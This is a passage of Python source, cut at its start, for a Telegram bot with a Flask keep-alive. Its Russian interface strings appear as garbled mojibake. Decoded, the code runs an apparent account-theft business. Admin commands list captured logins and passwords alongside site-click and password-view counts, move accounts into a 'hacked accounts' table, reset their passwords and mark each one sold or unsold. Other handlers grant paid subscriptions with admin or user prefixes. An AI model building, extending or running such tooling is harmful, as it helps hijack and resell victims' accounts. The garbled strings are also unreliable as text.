        types.InlineKeyboardButton("üì¶ –ù–µ –ø—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ù–µ –ø—Ä–æ–¥–∞–Ω_{chat_id}")
    )
    print(f"–ó–∞–ø—Ä–æ—Å —Å—Ç–∞—Ç—É—Å–∞ –¥–ª—è {login} –æ—Ç {chat_id}")
    bot.reply_to(message, f"üîì –£–∫–∞–∂–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –¥–ª—è `{login}`:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /admin –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /admin: {access}")
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        print("–°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç")
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.")
        return
    response = "üëë **–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞**\nüìã –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n\n"
    print(f"–ü–æ–ª—É—á–µ–Ω —Å–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {users}")
    for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
        try:
            print(f"–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ {chat_id_user}")
            user_info = bot.get_chat(chat_id_user)
            username = f"@{user_info.username}" if user_info.username else "–ù–µ—Ç —é–∑–µ—Ä–Ω–µ–π–º–∞"
            print(f"–Æ–∑–µ—Ä–Ω–µ–π–º –¥–ª—è {chat_id_user}: {username}")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —é–∑–µ—Ä–Ω–µ–π–º–∞ –¥–ª—è {chat_id_user}: {e}")
            username = "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è"
        time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
        response += (f"üÜî Chat ID: `{chat_id_user}`\n"
                     f"üë§ –Æ–∑–µ—Ä–Ω–µ–π–º: {username}\n"
                     f"üëë –ü—Ä–µ—Ñ–∏–∫—Å: {prefix}\n"
                     f"‚è≥ –ü–æ–¥–ø–∏—Å–∫–∞: {time_left} –¥–Ω–µ–π\n"
                     f"üåê –ö–ª–∏–∫–æ–≤ –Ω–∞ —Å–∞–π—Ç: {site_clicks or 0}\n"
                     f"üîë –ü—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π: {password_views or 0}\n\n")
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ /admin –¥–ª—è {chat_id}")
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"–û—Ç–≤–µ—Ç –Ω–∞ /admin –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è {chat_id}")

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /adprefix –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /adprefix: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /adprefix")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /adprefix <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏>\n–ü—Ä–∏–º–µ—Ä: /adprefix 123456789 –ê–¥–º–∏–Ω 30")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["–ê–¥–º–∏–Ω", "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"]:
        print(f"–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–π –ø—Ä–µ—Ñ–∏–∫—Å: {prefix}")
        bot.reply_to(message, "‚ùå –ü—Ä–µ—Ñ–∏–∫—Å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å: –ê–¥–º–∏–Ω –∏–ª–∏ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!")
        return
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    print(f"–ü—Ä–µ—Ñ–∏–∫—Å {prefix} –≤—ã–¥–∞–Ω –¥–ª—è {target_chat_id} –Ω–∞ {days} –¥–Ω–µ–π")
    bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é `{target_chat_id}` –≤—ã–¥–∞–Ω –ø—Ä–µ—Ñ–∏–∫—Å `{prefix}` –Ω–∞ {days} –¥–Ω–µ–π!", parse_mode='Markdown')

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /delprefix –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /delprefix: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /delprefix")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /delprefix <chat_id>\n–ü—Ä–∏–º–µ—Ä: /delprefix 123456789")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å", get_current_time())
    print(f"–ü—Ä–µ—Ñ–∏–∫—Å —Å–±—Ä–æ—à–µ–Ω –¥–ª—è {target_chat_id}")
    bot.reply_to(message, f"‚úÖ –ü—Ä–µ—Ñ–∏–∫—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `{target_chat_id}` —Å–±—Ä–æ—à–µ–Ω –¥–æ `–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å`!", parse_mode='Markdown')

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /database –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /database: {access}")
        bot.reply_to(message, access)
        return
    
    response = "üìä **–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö**\n\n"
    users = get_all_users()
    response += "üë§ **–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏**:\n"
    if not users:
        response += "–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç\n"
    else:
        for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
            response += f"üÜî `{chat_id_user}` | üëë {prefix} | ‚è≥ {time_left} –¥–Ω–µ–π\n"
    
    credentials = get_credentials()
    response += "\nüîë **–ü–∞—Ä–æ–ª–∏**:\n"
    if not credentials:
        response += "–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç\n"
    else:
        for login, password, added_time in credentials:
            formatted_time = format_time_with_minutes(added_time)
            response += f"üë§ `{login}` | üîí `{password}` | ‚è∞ {formatted_time}\n"
    
    hacked_accounts = get_hacked_accounts()
    response += "\nüîì **–í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã**:\n"
    if not hacked_accounts:
        response += "–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç\n"
    else:
        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
            formatted_time = format_time_with_minutes(hack_date)
            response += f"üë§ `{login}` | üîí `{password}` | ‚è∞ {formatted_time} | üí∞ {sold_status}\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å", callback_data="db_add"),
        types.InlineKeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å", callback_data="db_delete"),
        types.InlineKeyboardButton("üëÅ –ü—Ä–æ—Å–º–æ—Ç—Ä", callback_data="db_view")
    )
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –±–∞–∑—ã –¥–ª—è {chat_id}")
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def add_user_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /adduser –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /adduser: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /adduser")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /adduser <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏>\n–ü—Ä–∏–º–µ—Ä: /adduser 123456789 –ê–¥–º–∏–Ω 30")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_chat_id} –¥–æ–±–∞–≤–ª–µ–Ω —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {prefix} –Ω–∞ {days} –¥–Ω–µ–π")
    bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `{target_chat_id}` –¥–æ–±–∞–≤–ª–µ–Ω —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º `{prefix}` –Ω–∞ {days} –¥–Ω–µ–π!", parse_mode='Markdown')

@bot.message_handler(commands=['addcred'])
def add_cred_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /addcred –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /addcred: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /addcred")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /addcred <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>\n–ü—Ä–∏–º–µ—Ä: /addcred test test123")
        return
    login, password = args[0], args[1]
    if save_credentials(login, password):
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–æ–±–∞–≤–ª–µ–Ω—ã: {login}")
        bot.reply_to(message, f"‚úÖ –õ–æ–≥–∏–Ω `{login}` —Å –ø–∞—Ä–æ–ª–µ–º `{password}` –¥–æ–±–∞–≤–ª–µ–Ω!", parse_mode='Markdown')
    else:
        print("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö")
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data == "add_hacked" or call.data.startswith("hack_cred_"))
def handle_hack_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ callback –¥–ª—è chat_id: {chat_id}, data: {call.data}")
    
    if call.data == "add_hacked":
        print(f"–ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –æ—Ç {chat_id}")
        msg = bot.edit_message_text("üìù –í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å:\n–§–æ—Ä–º–∞—Ç: `<–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>`\n–ü—Ä–∏–º–µ—Ä: `test test123`",
                                  chat_id, call.message.message_id, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        pending_hacked[chat_id] = {'step': 'awaiting_input', 'message_id': msg.message_id}
        return
    
    if call.data.startswith("hack_cred_"):
        parts = call.data.split("_")
        if len(parts) != 4:
            print("–û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö –≤ hack_cred")
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö")
            return
        login = parts[2]
        linked_chat_id = parts[3]
        credentials = get_credentials()
        password = next((cred[1] for cred in credentials if cred[0] == login), None)
        if not password:
            print(f"–õ–æ–≥–∏–Ω {login} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ credentials")
            bot.answer_callback_query(call.id, "‚ùå –õ–æ–≥–∏–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("üí∞ –ü—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ü—Ä–æ–¥–∞–Ω_{linked_chat_id}"),
            types.InlineKeyboardButton("üì¶ –ù–µ –ø—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ù–µ –ø—Ä–æ–¥–∞–Ω_{linked_chat_id}")
        )
        print(f"–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è {chat_id} —Å –≤—ã–±–æ—Ä–æ–º —Å—Ç–∞—Ç—É—Å–∞")
        bot.edit_message_text(f"üîì –£–∫–∞–∂–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –¥–ª—è `{login}`:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    
    if call.data.startswith("hack_"):
        parts = call.data.split("_")
        if len(parts) != 5:
            print("–û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö –≤ hack")
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö")
            return
        login, old_password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
        user = get_user(chat_id)
        if not user:
            print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω")
            bot.answer_callback_query(call.id, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return
        
        msg = bot.edit_message_text(f"üîì –ê–∫–∫–∞—É–Ω—Ç `{login}` —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º '{sold_status}'.\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å:",
                                  chat_id, call.message.message_id, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        pending_hacked[chat_id] = {
            'login': login,
            'old_password': old_password,
            'sold_status': sold_status,
            'linked_chat_id': linked_chat_id,
            'message_id': msg.message_id,
            'step': 'awaiting_new_password',
            'from_passwords': call.data.startswith("hack_cred_")
        }
        print(f"–û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–∞—Ä–æ–ª—è –¥–ª—è {login} –æ—Ç {chat_id}")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_hacked)
def handle_hacked_input(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –¥–ª—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –æ—Ç chat_id: {chat_id}")
    if chat_id not in pending_hacked:
        print(f"–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤–∑–ª–æ–º–∞ –¥–ª—è {chat_id}")
        return
    
    data = pending_hacked[chat_id]
    step = data.get('step')
    
    if step == 'awaiting_input':
        args = message.text.strip().split()
        if len(args) != 2:
            print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –≤–≤–æ–¥–∞ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞")
            bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: `<–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>`\n–ü—Ä–∏–º–µ—Ä: `test test123`", parse_mode='Markdown')
            return
        login, password = args[0], args[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("üí∞ –ü—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ü—Ä–æ–¥–∞–Ω_{chat_id}"),
            types.InlineKeyboardButton("üì¶ –ù–µ –ø—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ù–µ –ø—Ä–æ–¥–∞–Ω_{chat_id}")
        )
        print(f"–ó–∞–ø—Ä–æ—Å —Å—Ç–∞—Ç—É—Å–∞ –¥–ª—è {login} –æ—Ç {chat_id}")
        bot.reply_to(message, f"üîì –£–∫–∞–∂–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –¥–ª—è `{login}`:", reply_markup=markup, parse_mode='Markdown')
        del pending_hacked[chat_id]
    
    elif step == 'awaiting_new_password':
        new_password = message.text.strip()
        login = data['login']
        sold_status = data['sold_status']
        linked_chat_id = data['linked_chat_id']
        user = get_user(chat_id)
        prefix = user['prefix']
        
        if save_hacked_account(login, new_password, prefix, sold_status, linked_chat_id):
            if data.get('from_passwords'):
                delete_credentials(login)  # –£–¥–∞–ª—è–µ–º –∏–∑ credentials, –µ—Å–ª–∏ –∏–∑ /passwords
            print(f"–ê–∫–∫–∞—É–Ω—Ç {login} –¥–æ–±–∞–≤–ª–µ–Ω –≤ hacked —Å –Ω–æ–≤—ã–º –ø–∞—Ä–æ–ª–µ–º")
            bot.reply_to(message, f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç `{login}` —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ!\n"
                                f"üîí –ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å: `{new_password}`\n"
                                f"üí∞ –°—Ç–∞—Ç—É—Å: {sold_status}\n"
                                f"üëë –ü—Ä–µ—Ñ–∏–∫—Å: {prefix}", parse_mode='Markdown')
        else:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–∞ {login}")
            bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–∞!")
        del pending_hacked[chat_id]
        print(f"–ü—Ä–æ—Ü–µ—Å—Å –≤–∑–ª–æ–º–∞ –∑–∞–≤–µ—Ä—à–µ–Ω –¥–ª—è {chat_id}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def handle_delete_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ callback —É–¥–∞–ª–µ–Ω–∏—è –¥–ª—è chat_id: {chat_id}, data: {call.data}")
    
    if call.data.startswith("delete_cred_"):
        login = call.data[len("delete_cred_"):]
        if delete_credentials(login):
            print(f"–õ–æ–≥–∏–Ω {login} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ credentials")
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω `{login}` —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –ø–∞—Ä–æ–ª–µ–π!", 
                                 chat_id, call.message.message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ª–æ–≥–∏–Ω–∞ {login} –∏–∑ credentials")
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏!")
    
    elif call.data.startswith("delete_hacked_"):
        login = call.data[len("delete_hacked_"):]
        if delete_hacked_account(login):
            print(f"–õ–æ–≥–∏–Ω {login} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ hacked")
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω `{login}` —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö!", 
                                 chat_id, call.message.message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ª–æ–≥–∏–Ω–∞ {login} –∏–∑ hacked")
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏!")

@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    chat_id = str(message.chat.id)
    print(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è chat_id: {chat_id} - {message.text}")
    response = "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞!\n–í–æ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥:\n" \
               "/start ‚Äî –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞\n" \
               "/menu ‚Äî –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é\n" \
               "/getchatid ‚Äî –≤–∞—à ID\n" \
               "/support ‚Äî —Å–æ–æ–±—â–∏—Ç—å –æ–± –æ—à–∏–±–∫–µ\n" \
               "–î–ª—è –ø–æ–ª–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu"
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –æ—Ç–≤–µ—Ç –Ω–∞ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—É—é –∫–æ–º–∞–Ω–¥—É –¥–ª—è {chat_id}")

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏ –∑–∞–ø—É—Å–∫ ===
print("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ")
init_db()

if __name__ == "__main__":
    print("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞")
    threading.Thread(target=keep_alive, daemon=True).start()  # –ó–∞–ø—É—Å–∫–∞–µ–º keep_alive –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    port = int(os.environ.get('PORT', 10000))  # –ü–æ–ª—É—á–∞–µ–º –ø–æ—Ä—Ç –æ—Ç Render –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º 10000
    print(f"–ó–∞–ø—É—Å–∫ Flask –Ω–∞ –ø–æ—Ä—Ç—É {port}")
    app.run(host='0.0.0.0', port=port)  # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
